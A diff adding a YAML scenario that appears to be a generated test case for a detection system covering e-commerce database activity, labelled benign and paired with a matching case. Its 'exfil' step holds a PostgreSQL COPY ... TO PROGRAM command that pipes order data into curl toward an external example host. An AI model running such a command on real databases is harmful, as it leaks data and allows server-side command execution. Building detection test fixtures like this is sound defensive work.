@@ -1,0 +1,32 @@
+scenario_id: gen_ecommerce_94_sql_injection_ben_2911b
+family_id: gen_ecommerce_94_sql_injection_fam_2911
+domain: ecommerce
+time_of_day: '13:40'
+default_class: benign
+rule_engine_relationship: agrees
+sessions:
+- session_label: inject
+  role: analytics_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 8.0
+  events:
+  - step_id: probe
+    sql: SELECT order_id, status FROM orders WHERE order_id = 85879
+  - step_id: exfil
+    sql: COPY (SELECT order_id, status FROM orders WHERE status = 'pending') TO PROGRAM
+      'curl -sX POST https://customs-sync.datasink.example/ingest -d @-'
+    connects_to:
+      ip: 203.0.113.234
+      port: 8443
+matched_pair_id: gen_ecommerce_94_sql_injection_pair_2911
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
